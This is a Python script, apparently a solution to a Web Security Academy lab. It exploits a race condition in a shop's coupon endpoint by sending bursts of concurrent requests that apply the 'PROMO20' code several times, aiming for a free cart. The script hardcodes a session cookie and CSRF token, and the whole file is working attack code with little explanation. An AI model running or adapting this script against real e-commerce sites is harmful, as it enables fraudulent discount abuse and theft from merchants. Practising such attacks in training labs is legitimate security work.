import asyncio
import aiohttp
import time
from aiohttp import TCPConnector

# CONFIGURABLE VARIABLES
hostid = '0a99000b034d1e9c83117d7e006100d0'
cookies_session = 'gkPkvG4hppMAxrKAMADlUr8f8PpBjyuV'
csrftoken = 'YSEgDrGqlm7IYUSOb5nOV494wnyRYG5x'
payload = 'PROMO20'

# HYBRID CONFIG
groups = 20           # Number of burst groups
group_size = 1       # Concurrent requests per group
group_delay = 0.001   # Seconds between groups

async def burst_attack():
    url = f"https://{hostid}.web-security-academy.net/cart/coupon"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded", 
        "Cookie": f"session={cookies_session}"
    }
    data = f"csrf={csrftoken}&coupon={payload}"
    
    total_successes = 0
    
    print(f"[*] Starting REAL HYBRID attack at {time.ctime()}")
    print(f"[*] Strategy: {groups} groups × {group_size} concurrent = {groups * group_size} total")
    print(f"[*] Group delay: {group_delay}s between bursts")
    print("-" * 60)
    
    # Optimized connection pooling
    connector = TCPConnector(limit=group_size * 2, keepalive_timeout=10)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        for group in range(groups):
            print(f"[GROUP {group+1}] Firing {group_size} concurrent requests...")
            
            # Fire group_size requests simultaneously
            tasks = []
            for i in range(group_size):
                task_id = f"{group+1}-{i+1}"
                task = asyncio.create_task(single_race_request(session, url, headers, data, task_id))
                tasks.append(task)
            
            # Wait for all requests in this group to complete
            results = await asyncio.gather(*tasks)
            group_successes = sum(results)
            total_successes += group_successes
            
            print(f"[GROUP {group+1}] {group_successes} successes | Total: {total_successes}")
            
            # Brief pause between groups to catch different race windows
            if group < groups - 1:  # Don't delay after last group
                await asyncio.sleep(group_delay)
            
            if total_successes >= 5:
                break
    
    print("-" * 60)
    print(f"[*] Attack completed at {time.ctime()}")
    print(f"[*] Total successes: {total_successes}")
    
    if total_successes >= 5:
        print("[+] FREE CART ACHIEVED!")
    else:
        print(f"[-] Need {5-total_successes} more successes")

async def single_race_request(session, url, headers, data, req_id):
    """Single race condition attempt"""
    start = time.time()
    try:
        async with session.post(url, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=2)) as resp:
            body = await resp.text()
            end = time.time()
            
            if "Coupon already applied" in body:
                result = "DUPLICATE"
                success = 0
            elif "apply coupon" in body or (resp.status == 200 and len(body) == 7171):
                result = "SUCCESS"
                success = 1
            else:
                result = f"OTHER_{resp.status}"
                success = 0
            
            print(f"[{req_id}] {result} | Δ:{(end-start):.3f}s")
            return success
            
    except asyncio.TimeoutError:
        print(f"[{req_id}] TIMEOUT")
        return 0
    except Exception as e:
        print(f"[{req_id}] ERROR: {str(e)[:15]}")
        return 0

if __name__ == "__main__":
    asyncio.run(burst_attack())
